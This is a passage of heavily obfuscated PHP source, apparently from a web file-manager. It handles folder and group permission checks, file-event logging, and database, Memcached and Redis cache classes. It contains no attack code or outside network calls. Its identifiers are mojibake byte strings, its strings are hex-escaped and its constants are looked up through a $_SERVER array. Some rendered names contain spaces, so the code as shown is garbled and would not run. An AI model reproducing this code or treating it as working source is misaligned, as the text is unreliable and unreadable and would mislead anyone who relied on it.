$ŒƒÃ¤‰[1933] => array($ŒƒÃ¤‰[425] => $şÒ‹¥ÀÁ[$ŒƒÃ¤‰[28]], $ŒƒÃ¤‰[86] => KodIO::make($şÒ‹¥ÀÁ[$ŒƒÃ¤‰[95]][$ŒƒÃ¤‰[407]]), $ŒƒÃ¤‰[1939] => $şÒ‹¥ÀÁ[$ŒƒÃ¤‰[530]])); } protected function groupRootAuth($ƒ²½äïß, $¨à´î‡ = false) { $å­™£›à =& $_SERVER[Á÷ ­Šë]; $¨à´î‡ = $¨à´î‡ ? $¨à´î‡ : USER_ID; $»©‹«ø´ = $¨à´î‡ . $å­™£›à[1943] . $ƒ²½äïß; static $³ñ©ŒÚ = array(); if (isset($³ñ©ŒÚ[$»©‹«ø´])) { return $³ñ©ŒÚ[$»©‹«ø´]; } $ë³ØÀ¢Æ = Model($å­™£›à[526])->getInfo($ƒ²½äïß); $½äË…´ = $this->userGroupList($¨à´î‡); $úî×ÒŒ = isset($½äË…´[$ƒ²½äïß]) ? $½äË…´[$ƒ²½äïß][$å­™£›à[418]] : !1; if ($úî×ÒŒ && Model($å­™£›à[511])->authCheckAction($úî×ÒŒ[$å­™£›à[418]], $å­™£›à[1762])) { $³ñ©ŒÚ[$»©‹«ø´] = $úî×ÒŒ; return $úî×ÒŒ; } $Ÿ‡ÇŞ¶ = $this->sourceAuthSelect($ë³ØÀ¢Æ[$å­™£›à[95]][$å­™£›à[407]]); $ŒÚ¡ÛÕœ = $Ÿ‡ÇŞ¶ ? $this->authMake($Ÿ‡ÇŞ¶, $¨à´î‡) : !1; $õ•ì¶äš = $ŒÚ¡ÛÕœ ? $ŒÚ¡ÛÕœ[$å­™£›à[470]] : !1; $³ñ©ŒÚ[$»©‹«ø´] = $õ•ì¶äš ? $õ•ì¶äš : $úî×ÒŒ; return $³ñ©ŒÚ[$»©‹«ø´]; } public function authOwnerApply($ÀêÙ©ÑÇ) { $­„šÆ«ª =& $_SERVER[Á÷ ­Šë]; if (empty($ÀêÙ©ÑÇ[$­„šÆ«ª[418]]) || isset($ÀêÙ©ÑÇ[$­„šÆ«ª[1944]]) && $ÀêÙ©ÑÇ[$­„šÆ«ª[1944]]) { return $ÀêÙ©ÑÇ; } if (AuthModel::authCheckRoot($ÀêÙ©ÑÇ[$­„šÆ«ª[418]][$­„šÆ«ª[419]])) { return $ÀêÙ©ÑÇ; } $ûÎì”Îş = Model($­„šÆ«ª[1249])->parentLevelArray($ÀêÙ©ÑÇ[$­„šÆ«ª[525]]); $ûÎì”Îş = array_merge(array($ÀêÙ©ÑÇ[$­„šÆ«ª[407]]), array_reverse($ûÎì”Îş)); $­´•Úªî = $this->sourceAuthSelect($ûÎì”Îş); $ˆ“Š…á· = array(); $¾ş–¦Û„ = array(); foreach ($­´•Úªî as $ÍĞòĞëŒ => $ø¼ßÏ‹Ñ) { $²Öéûëå = $this->authFolderOwnerUser($ø¼ßÏ‹Ñ); $ˆ“Š…á·[$ÍĞòĞëŒ] = $²Öéûëå; $¾ş–¦Û„ = array_merge($¾ş–¦Û„, $²Öéûëå[$­„šÆ«ª[598]]); if ($²Öéûëå[$­„šÆ«ª[1945]]) { break; } } if (count($¾ş–¦Û„) == 0) { $¾ş–¦Û„ = $this->authFolderOwnerGroup($ÀêÙ©ÑÇ[$­„šÆ«ª[508]]); } $¾ş–¦Û„ = array_unique($¾ş–¦Û„); if (AuthModel::authCheckRoot($ÀêÙ©ÑÇ[$­„šÆ«ª[418]][$­„šÆ«ª[419]])) { $¾ş–¦Û„[] = USER_ID; } $ÀêÙ©ÑÇ[$­„šÆ«ª[418]][$­„šÆ«ª[1946]] = Model($­„šÆ«ª[517])->userListInfo($¾ş–¦Û„); return $ÀêÙ©ÑÇ; } private function authFolderOwnerGroup($ÖµÛÓò) { $˜£ÕšÊ’ =& $_SERVER[Á÷ ­Šë]; $«ÉëŸ = Model($˜£ÕšÊ’[1831])->where(array($˜£ÕšÊ’[1742] => $ÖµÛÓò))->select(); $‰‘´ï‘Û = array(); if (!$«ÉëŸ) { return $‰‘´ï‘Û; } foreach ($«ÉëŸ as $³–¬Õˆ) { $àÍâäÉ¬ = $this->authInfo($³–¬Õˆ); if (AuthModel::authCheckRoot($àÍâäÉ¬[$˜£ÕšÊ’[418]])) { $‰‘´ï‘Û[] = $³–¬Õˆ[$˜£ÕšÊ’[1574]]; } } return $‰‘´ï‘Û; } private function authFolderOwnerUser($‰šÓÓç¼) { $êŒ…Œ¹ñ =& $_SERVER[Á÷ ­Šë]; $•¸•Œ²Í = array(); $ÊÅ—Æù = !1; foreach ($‰šÓÓç¼ as $â˜Å±Ù°) { $§¢§ğˆú = $this->authInfo($â˜Å±Ù°); if ($â˜Å±Ù°[$êŒ…Œ¹ñ[508]] == $êŒ…Œ¹ñ[201]) { $ÊÅ—Æù = !0; } if ($â˜Å±Ù°[$êŒ…Œ¹ñ[416]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($§¢§ğˆú[$êŒ…Œ¹ñ[418]])) { $•¸•Œ²Í[] = $â˜Å±Ù°[$êŒ…Œ¹ñ[508]]; } } } return array($êŒ…Œ¹ñ[598] => $•¸•Œ²Í, $êŒ…Œ¹ñ[1945] => $ÊÅ—Æù); } public function authMake($›Â¯ƒë´, $—»’ÅÃ¸ = false) { $ĞÙ´‚Ã» =& $_SERVER[Á÷ ­Šë]; $ñïõÖæ‰ = $this->authArrayCheck($›Â¯ƒë´, $—»’ÅÃ¸); if ($ñïõÖæ‰[$ĞÙ´‚Ã»[1947]]) { $ñïõÖæ‰[$ĞÙ´‚Ã»[1947]] = $this->sourceAuthInfo($ñïõÖæ‰[$ĞÙ´‚Ã»[1947]]); } return $ñïõÖæ‰; } public function authArrayCheck($¿Ã¢õÑ„, $å…É½â = false) { $–‘èßûæ =& $_SERVER[Á÷ ­Šë]; if (!$¿Ã¢õÑ„) { return array($–‘èßûæ[419] => 0, $–‘èßûæ[470] => !1); } $å…É½â = $å…É½â ? $å…É½â : USER_ID; $Û‚ıåÈ£ = 0; $âŠË‚´¾ = 0; $£ú°ŒÑ = 0; $ÔÃ÷¤Ê¢ = 0; $™‚±ğ¡ = 0; $‘èæğÏ° = 0; $´£®Ñé = 1000; $¡ÊÕÙÙ = 0; $ĞÓßÖÛ = 0; $ÖâÆ‹Ä¬ = 0; $ÚÜÉÕê‰ = 0; $¡æŞåÕ¸ = array($–‘èßûæ[407] => 0); foreach ($¿Ã¢õÑ„ as $¡æŞåÕ¸) { $¥é€î¯º = $this->authInfo($¡æŞåÕ¸); if (!$¥é€î¯º) { continue; } $Âë·ìÖ = $¡æŞåÕ¸[$–‘èßûæ[508]]; $¢È÷¥½á = intval($¥é€î¯º[$–‘èßûæ[418]]); if ($¡æŞåÕ¸[$–‘èßûæ[416]] == SourceModel::TYPE_USER && $Âë·ìÖ == $å…É½â) { $Û‚ıåÈ£ = !0; $£ú°ŒÑ = $¥é€î¯º; $âŠË‚´¾ = $¢È÷¥½á; } else { if ($¡æŞåÕ¸[$–‘èßûæ[416]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Âë·ìÖ, $å…É½â)) { $ÔÃ÷¤Ê¢ = !0; $ÎœÃÏ­â = $this->groupStepToUserGroup($Âë·ìÖ, $å…É½â); if ($ÎœÃÏ­â < $´£®Ñé) { $´£®Ñé = $ÎœÃÏ­â; $™‚±ğ¡ = $¢È÷¥½á; $‘èæğÏ° = $¥é€î¯º; $¡ÊÕÙÙ = $Âë·ìÖ; } if ($ÎœÃÏ­â == $´£®Ñé && $¢È÷¥½á >= $™‚±ğ¡) { $™‚±ğ¡ = $¢È÷¥½á; $‘èæğÏ° = $¥é€î¯º; $¡ÊÕÙÙ = $Âë·ìÖ; } } else { if ($Âë·ìÖ == $–‘èßûæ[201]) { $ĞÓßÖÛ = !0; $ÚÜÉÕê‰ = $¥é€î¯º; $ÖâÆ‹Ä¬ = $¢È÷¥½á; } } } } if ($Û‚ıåÈ£) { $ç¯îÚòƒ = $âŠË‚´¾; $¥é€î¯º = $£ú°ŒÑ; $ˆ›Şíƒí = LNG($–‘èßûæ[1948]); } else { if ($ÔÃ÷¤Ê¢) { $ç¯îÚòƒ = $™‚±ğ¡; $¥é€î¯º = $‘èæğÏ°; $½Œè¾¤‡ = Model($–‘èßûæ[526])->getInfo($¡ÊÕÙÙ); $ˆ›Şíƒí = $–‘èßûæ[170] . $½Œè¾¤‡[$–‘èßûæ[530]] . $–‘èßûæ[1949] . LNG($–‘èßûæ[1950]); } else { if ($ĞÓßÖÛ) { $ç¯îÚòƒ = $ÖâÆ‹Ä¬; $¥é€î¯º = $ÚÜÉÕê‰; $ˆ›Şíƒí = LNG($–‘èßûæ[1921]); } else { $ç¯îÚòƒ = 0; $¥é€î¯º = !1; $ˆ›Şíƒí = $–‘èßûæ[33]; } } } $ÑĞëğ¤ = array($–‘èßûæ[1940] => intval($ç¯îÚòƒ), $–‘èßûæ[1924] => $¥é€î¯º, $–‘èßûæ[1941] => $ˆ›Şíƒí, $–‘èßûæ[1933] => $¡æŞåÕ¸[$–‘èßûæ[407]]); return $ÑĞëğ¤; } private function groupContainUser($Æ¹ÔËã, $ş—•ïù“ = false) { return in_array($Æ¹ÔËã, $this->userGroupParents($ş—•ïù“)); } private function groupStepToUserGroup($ø¯öùß©, $ƒ­˜ÁŸú = false) { $…ğê‹Àı =& $_SERVER[Á÷ ­Šë]; $²¬¿ÃßŒ = $this->userGroupList($ƒ­˜ÁŸú); $àËöÛâÇ = 1000; $±éê«Ÿ‰ = $GLOBALS[$…ğê‹Àı[6]][$…ğê‹Àı[98]][$…ğê‹Àı[1842]] == 1; $³Ì˜òÙÜ = $±éê«Ÿ‰ ? 3 : 2; foreach ($²¬¿ÃßŒ as $ò¤¥°ƒñ) { if ($ò¤¥°ƒñ[$…ğê‹Àı[1742]] == $ø¯öùß©) { return 0; } $Ù¬»­ÃÇ = explode($…ğê‹Àı[47], trim($ò¤¥°ƒñ[$…ğê‹Àı[525]], $…ğê‹Àı[47])); if ($Ù¬»­ÃÇ[0] == $…ğê‹Àı[201] && count($Ù¬»­ÃÇ) > $³Ì˜òÙÜ) { $èµ×«îŸ = array_reverse(array_slice($Ù¬»­ÃÇ, $³Ì˜òÙÜ)); $¥ù¾÷áÇ = array_search($ø¯öùß©, $èµ×«îŸ); if ($¥ù¾÷áÇ !== !1 && $¥ù¾÷áÇ + 1 <= $àËöÛâÇ) { $àËöÛâÇ = $¥ù¾÷áÇ + 1; } } } return $àËöÛâÇ; } private function userGroupList($¬·œş›¼ = false) { $º…æ¿Š¹ =& $_SERVER[Á÷ ­Šë]; static $İã™ÀŒÆ = array(); if (isset($İã™ÀŒÆ[$¬·œş›¼])) { return $İã™ÀŒÆ[$¬·œş›¼]; } $¹ì¿ì®… = Model($º…æ¿Š¹[542])->getInfo($¬·œş›¼); $İã™ÀŒÆ[$¬·œş›¼] = array_to_keyvalue($¹ì¿ì®…[$º…æ¿Š¹[1922]], $º…æ¿Š¹[1742]); return $İã™ÀŒÆ[$¬·œş›¼]; } public function userGroupParents($Ãæ¢¼) { $ÑşÇ†º =& $_SERVER[Á÷ ­Šë]; static $‡è–“Ø™ = array(); $Ãæ¢¼ = $Ãæ¢¼ ? $Ãæ¢¼ : USER_ID; if (isset($‡è–“Ø™[$Ãæ¢¼])) { return $‡è–“Ø™[$Ãæ¢¼]; } $Á¨Ó…œ· = $this->userGroupList($Ãæ¢¼); $Ïğ‰³Ì = array(); $¿İªò®Ë = $GLOBALS[$ÑşÇ†º[6]][$ÑşÇ†º[98]][$ÑşÇ†º[1842]] == 1; $¿’î“¾Í = $¿İªò®Ë ? 3 : 2; foreach ($Á¨Ó…œ· as $ï’ªĞŸÏ) { $ºĞ³ı‰ª = array($ï’ªĞŸÏ[$ÑşÇ†º[1742]]); $½ƒß¹Âß = explode($ÑşÇ†º[47], trim($ï’ªĞŸÏ[$ÑşÇ†º[525]], $ÑşÇ†º[47])); if ($½ƒß¹Âß[0] == $ÑşÇ†º[201] && count($½ƒß¹Âß) > $¿’î“¾Í) { $™ë³˜´® = array_slice($½ƒß¹Âß, $¿’î“¾Í); $ºĞ³ı‰ª = array_merge($ºĞ³ı‰ª, array_reverse($™ë³˜´®)); } $Ïğ‰³Ì = array_merge($Ïğ‰³Ì, $ºĞ³ı‰ª); } $‡è–“Ø™[$Ãæ¢¼] = array_unique($Ïğ‰³Ì); return $‡è–“Ø™[$Ãæ¢¼]; } public function authTargetInfoMake($‘¾¦Ó²Û) { $×¯–ˆÀú =& $_SERVER[Á÷ ­Šë]; $€¾Ÿ¦ÖÑ = array(); $“É¦øäÆ = array(); foreach ($‘¾¦Ó²Û as $«¬şÏóá) { if ($«¬şÏóá[$×¯–ˆÀú[416]] == SourceModel::TYPE_USER) { $€¾Ÿ¦ÖÑ[] = intval($«¬şÏóá[$×¯–ˆÀú[508]]); } else { if ($«¬şÏóá[$×¯–ˆÀú[416]] == SourceModel::TYPE_GROUP) { $“É¦øäÆ[] = intval($«¬şÏóá[$×¯–ˆÀú[508]]); } } } if ($€¾Ÿ¦ÖÑ) { $€¾Ÿ¦ÖÑ = Model($×¯–ˆÀú[517])->userListInfo($€¾Ÿ¦ÖÑ); } if ($“É¦øäÆ) { $ı¦úœÕ¤ = array($×¯–ˆÀú[1829] => array($×¯–ˆÀú[423], $“É¦øäÆ)); $“É¦øäÆ = Model($×¯–ˆÀú[526])->field($×¯–ˆÀú[1951])->where($ı¦úœÕ¤)->select(); $“É¦øäÆ = array_to_keyvalue($“É¦øäÆ, $×¯–ˆÀú[1742]); } return array($×¯–ˆÀú[1952] => $€¾Ÿ¦ÖÑ, $×¯–ˆÀú[1953] => $“É¦øäÆ); } public function authInfo($¾¸ ¢´ú) { $¬ŞïØí’ =& $_SERVER[Á÷ ­Šë]; if ($¾¸ ¢´ú[$¬ŞïØí’[1845]]) { $‰åˆƒ¾… = Model($¬ŞïØí’[511])->listData($¾¸ ¢´ú[$¬ŞïØí’[1845]]); if (!$‰åˆƒ¾…) { return !1; $€áÁù• = Model($¬ŞïØí’[511])->listData(); $Îôİ¦šô = array_filter_by_field($€áÁù•, $¬ŞïØí’[418], $¬ŞïØí’[201]); return $Îôİ¦šô; } $û‡ªäµÃ = array_field_key($‰åˆƒ¾…, array($¬ŞïØí’[404], $¬ŞïØí’[28], $¬ŞïØí’[418], $¬ŞïØí’[1764], $¬ŞïØí’[1765])); $û‡ªäµÃ[$¬ŞïØí’[1954]] = $¾¸ ¢´ú; return $û‡ªäµÃ; } else { return array($¬ŞïØí’[424] => 0, $¬ŞïØí’[1748] => $¾¸ ¢´ú[$¬ŞïØí’[1899]], $¬ŞïØí’[425] => $¬ŞïØí’[33], $¬ŞïØí’[1764] => $¬ŞïØí’[1955]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\143\x65\x5f\x65\x76\x65\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\151\155\145", "\164\151\155\145", "\x69\156\163\145\x72\164", "\146\165\x6e\x63\164\x69\x6f\x6e"), array("\144\145\163\143", '', "\x69\156\163\145\x72\x74\54\165\160\x64\141\x74\x65\54\163\145\x6c\145\x63\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($²¡ÂÉÁ‡, $ÏÁ“ØÀ­, $’Ç„ôı‹ = '') { $ß­®Şôº =& $_SERVER[Á÷ ­Šë]; if (!$this->eventSave) { return; } $î£İş¾ = Model($ß­®Şôº[1249])->sourceInfo($²¡ÂÉÁ‡); if (!$î£İş¾) { return !1; } if ($this->isCacheEvent($î£İş¾, $ÏÁ“ØÀ­)) { return; } if ($’Ç„ôı‹ && is_string($’Ç„ôı‹)) { $’Ç„ôı‹ = array($ß­®Şôº[1780] => $’Ç„ôı‹); } $İ‚öşŸ = array($ß­®Şôº[422] => $²¡ÂÉÁ‡, $ß­®Şôº[1956] => $î£İş¾[$ß­®Şôº[502]], $ß­®Şôº[1957] => $î£İş¾[$ß­®Şôº[28]], $ß­®Şôº[523] => !empty($î£İş¾[$ß­®Şôº[523]]) ? $î£İş¾[$ß­®Şôº[523]] : $ß­®Şôº[33], $ß­®Şôº[1565] => USER_ID, $ß­®Şôº[427] => $ÏÁ“ØÀ­, $ß­®Şôº[1567] => $’Ç„ôı‹); $this->addSystemLog($ÏÁ“ØÀ­, $İ‚öşŸ); unset($İ‚öşŸ[$ß­®Şôº[1957]], $İ‚öşŸ[$ß­®Şôº[523]]); return $this->add($İ‚öşŸ); } private function addSystemLog($”ç§—, $É£ÛˆÜ) { $Ôêñá™ =& $_SERVER[Á÷ ­Šë]; if ($”ç§— == $Ôêñá™[1958]) { $”ç§— = $É£ÛˆÜ[$Ôêñá™[455]][$Ôêñá™[1959]]; } else { if (in_array($”ç§—, array($Ôêñá™[1721], $Ôêñá™[1960]))) { $”ç§— = $É£ÛˆÜ[$Ôêñá™[455]][$Ôêñá™[750]]; } } $‘ô¾¤ó˜ = array_merge($É£ÛˆÜ, array($Ôêñá™[1961] => $É£ÛˆÜ[$Ôêñá™[407]], $Ôêñá™[1962] => $É£ÛˆÜ[$Ôêñá™[1962]])); Model($Ôêñá™[1685])->addLog($Ôêñá™[1963] . $”ç§—, $‘ô¾¤ó˜); } private function isCacheEvent($•à‚¥‰, $¡Ğá¤¦Ë) { if ($•à‚¥‰[$_SERVER[Á÷ ­Šë][416]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($øæ÷©ş¹, $«ÃŒòØí) { $‘íóÍ²´ =& $_SERVER[Á÷ ­Šë]; $«³¬æ¢Â = Model($‘íóÍ²´[1249])->sourceInfo($øæ÷©ş¹); $í„’ĞÌş = array($‘íóÍ²´[1959] => $«ÃŒòØí, $‘íóÍ²´[28] => $«³¬æ¢Â[$‘íóÍ²´[28]]); return $this->addEvent($øæ÷©ş¹, $‘íóÍ²´[1958], $í„’ĞÌş); } public function eventFileEdit($„Œ¢å’Ô) { $ØæşÏóİ =& $_SERVER[Á÷ ­Šë]; $ó£æöàä = array($ØæşÏóİ[1964] => $_SERVER[$ØæşÏóİ[1965]], $ØæşÏóİ[1966] => strtolower(ACTION)); return $this->addEvent($„Œ¢å’Ô, $ØæşÏóİ[1711], $ó£æöàä); } public function eventRecycle($ÎœªÅ©, $í ÕÕá¥) { return $this->addEvent($ÎœªÅ©, $_SERVER[Á÷ ­Šë][1960], $í ÕÕá¥); } public function eventRemove($ù‚„øäï) { $æÓÍ¥õ =& $_SERVER[Á÷ ­Šë]; $¨â¯Î¹É = Model($æÓÍ¥õ[1249])->sourceInfo($ù‚„øäï); $”û“úâŒ = $¨â¯Î¹É[$æÓÍ¥õ[28]]; return $this->addEvent($¨â¯Î¹É[$æÓÍ¥õ[502]], $æÓÍ¥õ[1710], $”û“úâŒ); } public function eventShare($®İŞâÌ, $Õ›àÖØ­) { return $this->addEvent($®İŞâÌ, $_SERVER[Á÷ ­Šë][1721], $Õ›àÖØ­); } public function eventMove($Äº³¼©, $ëïìÄüº, $…õ¸³µè) { $äÂèá²æ =& $_SERVER[Á÷ ­Šë]; $±•Š¡èÉ = Model($äÂèá²æ[1249]); $ÑÈÒÚ’ã = $±•Š¡èÉ->sourceInfo($Äº³¼©); $Ûè“€– = $±•Š¡èÉ->sourceInfo($ëïìÄüº); $ÊË»Ôöí = $±•Š¡èÉ->sourceInfo($…õ¸³µè); $âæ”¾¦— = array($äÂèá²æ[1086] => $ëïìÄüº, $äÂèá²æ[1967] => $Ûè“€–[$äÂèá²æ[28]], $äÂèá²æ[1947] => !empty($Ûè“€–[$äÂèá²æ[523]]) ? $Ûè“€–[$äÂèá²æ[523]] : $äÂèá²æ[33], $äÂèá²æ[1087] => $…õ¸³µè, $äÂèá²æ[1968] => $ÊË»Ôöí[$äÂèá²æ[28]], $äÂèá²æ[1969] => !empty($ÊË»Ôöí[$äÂèá²æ[523]]) ? $ÊË»Ôöí[$äÂèá²æ[523]] : $äÂèá²æ[33]); $this->addEvent($Äº³¼©, $äÂèá²æ[555], $âæ”¾¦—); $ÑÈÒÚ’ã = $±•Š¡èÉ->sourceInfo($Äº³¼©); $âæ”¾¦— = array($äÂèá²æ[407] => $ÑÈÒÚ’ã[$äÂèá²æ[407]], $äÂèá²æ[28] => $ÑÈÒÚ’ã[$äÂèá²æ[28]]); $this->addEvent($ëïìÄüº, $äÂèá²æ[1970], $âæ”¾¦—); } public function eventCopy($§Ÿ°¶†í) { $this->eventCreate($§Ÿ°¶†í, $_SERVER[Á÷ ­Šë][553]); } public function eventRename($ª‡§áŠ¹, $ğšñ–Ì, $ôÎÇ‹àú) { $™¸û¯øŞ =& $_SERVER[Á÷ ­Šë]; $ŠÜØÈò = array($™¸û¯øŞ[1086] => $ğšñ–Ì, $™¸û¯øŞ[1087] => $ôÎÇ‹àú); return $this->addEvent($ª‡§áŠ¹, $™¸û¯øŞ[1264], $ŠÜØÈò); } public function eventAddComment($†™®ñÃ, $™ãª¿²Æ) { return $this->addEvent($†™®ñÃ, $_SERVER[Á÷ ­Šë][1971], $™ãª¿²Æ); } public function eventAddDesc($¸Êã¸Ã‚, $·®“íÉç) { return $this->addEvent($¸Êã¸Ã‚, $_SERVER[Á÷ ­Šë][1972], $·®“íÉç); } public function listBySource($ô¡¿ÊÖ) { $ê±ö¤ì =& $_SERVER[Á÷ ­Šë]; $°àÔŒıä = Model($ê±ö¤ì[1249])->sourceInfo($ô¡¿ÊÖ); $²šî±« = array($ê±ö¤ì[422] => $ô¡¿ÊÖ); if ($°àÔŒıä[$ê±ö¤ì[415]] == $ê±ö¤ì[97]) { $³óØó˜› = Model($ê±ö¤ì[1249])->listSearchChildren($ô¡¿ÊÖ, 20000); $³óØó˜›[] = $ô¡¿ÊÖ . $ê±ö¤ì[385]; $²šî±« = array($ê±ö¤ì[407] => array($ê±ö¤ì[7], $³óØó˜›)); } $ÔÉïÈö = $this->where($²šî±«)->order($ê±ö¤ì[1973])->selectPage(); if ($ÔÉïÈö[$ê±ö¤ì[373]][$ê±ö¤ì[374]] == 0) { $ÔÉïÈö[$ê±ö¤ì[373]][$ê±ö¤ì[374]] = 1; $ÔÉïÈö[$ê±ö¤ì[376]] = array(array($ê±ö¤ì[422] => $ô¡¿ÊÖ, $ê±ö¤ì[1956] => $°àÔŒıä[$ê±ö¤ì[502]], $ê±ö¤ì[1565] => $°àÔŒıä[$ê±ö¤ì[456]], $ê±ö¤ì[427] => $ê±ö¤ì[1974], $ê±ö¤ì[428] => $°àÔŒıä[$ê±ö¤ì[204]], $ê±ö¤ì[1567] => $ê±ö¤ì[33])); } return $this->eventListParse($ÔÉïÈö, $ô¡¿ÊÖ); } private function eventListParse($¶Ş¶»§İ, $€“­í¾) { $ŒÁèòş =& $_SERVER[Á÷ ­Šë]; $ú‡×„«¾ = $¶Ş¶»§İ[$ŒÁèòş[376]]; $¹™ŞÕ’ = array_to_keyvalue($ú‡×„«¾, $ŒÁèòş[33], $ŒÁèòş[407]); $ö “¡¤ = array_to_keyvalue($ú‡×„«¾, $ŒÁèòş[33], $ŒÁèòş[1962]); foreach ($ú‡×„«¾ as $ĞÒŞãöõ) { $é÷ĞŸ©¯ = $ĞÒŞãöõ[$ŒÁèòş[455]]; if ($ĞÒŞãöõ[$ŒÁèòş[29]] == $ŒÁèòş[555] && isset($é÷ĞŸ©¯[$ŒÁèòş[1086]])) { $¹™ŞÕ’[] = $é÷ĞŸ©¯[$ŒÁèòş[1086]] . $ŒÁèòş[33]; $¹™ŞÕ’[] = $é÷ĞŸ©¯[$ŒÁèòş[1087]] . $ŒÁèòş[33]; } if ($ĞÒŞãöõ[$ŒÁèòş[29]] == $ŒÁèòş[1970] && isset($é÷ĞŸ©¯[$ŒÁèòş[407]])) { $¹™ŞÕ’[] = $é÷ĞŸ©¯[$ŒÁèòş[407]] . $ŒÁèòş[33]; } } $¹™ŞÕ’ = array_merge($¹™ŞÕ’, $ö “¡¤, array($€“­í¾ . $ŒÁèòş[33])); $¹™ŞÕ’ = array_unique($¹™ŞÕ’); $“¸Îñê­ = array_unique(array_to_keyvalue($ú‡×„«¾, $ŒÁèòş[33], $ŒÁèòş[1574])); $õ†—åÅÉ = Model($ŒÁèòş[542])->userListInfo($“¸Îñê­); $óóÌôôé = Model($ŒÁèòş[827])->sourceListInfo($¹™ŞÕ’, !0); foreach ($ú‡×„«¾ as &$ĞÒŞãöõ) { if ($ĞÒŞãöõ[$ŒÁèòş[29]] == $ŒÁèòş[555] && isset($ĞÒŞãöõ[$ŒÁèòş[455]][$ŒÁèòş[1086]])) { $ĞÒŞãöõ[$ŒÁèòş[455]][$ŒÁèòş[1086]] = $óóÌôôé[$ĞÒŞãöõ[$ŒÁèòş[455]][$ŒÁèòş[1086]]]; $ĞÒŞãöõ[$ŒÁèòş[455]][$ŒÁèòş[1087]] = $óóÌôôé[$ĞÒŞãöõ[$ŒÁèòş[455]][$ŒÁèòş[1087]]]; } if ($ĞÒŞãöõ[$ŒÁèòş[29]] == $ŒÁèòş[1970] && isset($ĞÒŞãöõ[$ŒÁèòş[455]][$ŒÁèòş[407]])) { $ĞÒŞãöõ[$ŒÁèòş[455]][$ŒÁèòş[407]] = $óóÌôôé[$ĞÒŞãöõ[$ŒÁèòş[455]][$ŒÁèòş[407]]]; } $ĞÒŞãöõ[$ŒÁèòş[95]] = $óóÌôôé[$ĞÒŞãöõ[$ŒÁèòş[407]]]; $ĞÒŞãöõ[$ŒÁèòş[1975]] = $óóÌôôé[$ĞÒŞãöõ[$ŒÁèòş[1962]]]; if ($ĞÒŞãöõ[$ŒÁèòş[29]] == $ŒÁèòş[1710]) { $ĞÒŞãöõ[$ŒÁèòş[1975]] = $ĞÒŞãöõ[$ŒÁèòş[95]]; $ĞÒŞãöõ[$ŒÁèòş[1962]] = $ĞÒŞãöõ[$ŒÁèòş[1975]][$ŒÁèòş[407]]; $ĞÒŞãöõ[$ŒÁèòş[95]] = !1; $ĞÒŞãöõ[$ŒÁèòş[407]] = $ŒÁèòş[33]; } $ĞÒŞãöõ[$ŒÁèòş[1907]] = $õ†—åÅÉ[$ĞÒŞãöõ[$ŒÁèòş[1574]]]; } unset($ĞÒŞãöõ); $¶Ş¶»§İ[$ŒÁèòş[376]] = $ú‡×„«¾; return $¶Ş¶»§İ; } public function removeBySource($ó¥ÇÖ›Ÿ) { $€Ğ½ã€¯ = array($_SERVER[Á÷ ­Šë][422] => $ó¥ÇÖ›Ÿ); $this->where($€Ğ½ã€¯)->remove(); } } goto Eğ¤“á‰Ğ; Aö™İÒ§í: class CacheLockDatabase { public function lock($İ¾¾›ğ, $àÃ¯İ…â = 0) { $¨îºÏ†­ = Model($_SERVER[Á÷ ­Šë][831]); $–÷†£›Î = microtime(!0) + $àÃ¯İ…â; while (microtime(!0) < $–÷†£›Î) { $ŸÅ³¸†¹ = $¨îºÏ†­->get($İ¾¾›ğ); if (!$ŸÅ³¸†¹ || $ŸÅ³¸†¹ < microtime(!0)) { $ó´æÛÌÓ = $¨îºÏ†­->set($İ¾¾›ğ, $–÷†£›Î); if ($ó´æÛÌÓ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¢ Ê¢Ãû) { return Model($_SERVER[Á÷ ­Šë][831])->get($¢ Ê¢Ãû); } public function unlock($ô¹´ª¹Ï) { Model($_SERVER[Á÷ ­Šë][831])->remove($ô¹´ª¹Ï); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ì˜ßƒËı, $¦¦¤¿Óú) { $º“Ö×î© =& $_SERVER[Á÷ ­Šë]; if (!class_exists($º“Ö×î©[864])) { show_json($º“Ö×î©[865], !1); } $this->cacheTime = $¦¦¤¿Óú; $this->handle = new Memcached(); if (is_array($Ì˜ßƒËı[$º“Ö×î©[866]]) && count($Ì˜ßƒËı[$º“Ö×î©[866]]) >= 1) { foreach ($Ì˜ßƒËı[$º“Ö×î©[866]] as $ÚâŸÏœÚ) { $ôŒÚÚÁû = explode($º“Ö×î©[4], $ÚâŸÏœÚ); $this->handle->addServer($ôŒÚÚÁû[0], $ôŒÚÚÁû[1]); } } else { $this->handle->addServer($Ì˜ßƒËı[$º“Ö×î©[185]], $Ì˜ßƒËı[$º“Ö×î©[186]]); } } public function set($´„¦•±í, $–¾Ë”ô», $„ˆºÙ = false) { $„ˆºÙ = $„ˆºÙ ? $„ˆºÙ : $this->cacheTime; return $this->handle->set($´„¦•±í, $–¾Ë”ô», $„ˆºÙ); } public function get($àÔåŠ¸) { return $this->handle->get($àÔåŠ¸); } public function remove($ÔÇ ¯ˆñ) { return $this->handle->delete($ÔÇ ¯ˆñ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($şä¹¬­Ÿ, $ôµ–†À) { $Ò™ÌÔ“¦ =& $_SERVER[Á÷ ­Šë]; if (!class_exists($Ò™ÌÔ“¦[867])) { show_json($Ò™ÌÔ“¦[868], !1); } $this->cacheTime = $ôµ–†À; $Æ‘ñĞÄ = isset($şä¹¬­Ÿ[$Ò™ÌÔ“¦[869]]) ? $şä¹¬­Ÿ[$Ò™ÌÔ“¦[869]] : 10; $°™°¡«Ì = _get($şä¹¬­Ÿ, $Ò™ÌÔ“¦[866]); if ($°™°¡«Ì && is_array($°™°¡«Ì)) { $this->initCluster($şä¹¬­Ÿ, $Æ‘ñĞÄ); } else { $this->handle = $this->init($şä¹¬­Ÿ, $Æ‘ñĞÄ); } } private function init($“˜Ò€°, $†¥îƒö) { $™‰ã¡Ïò =& $_SERVER[Á÷ ­Šë]; $ä»Ê·Ç = new Redis(); $ 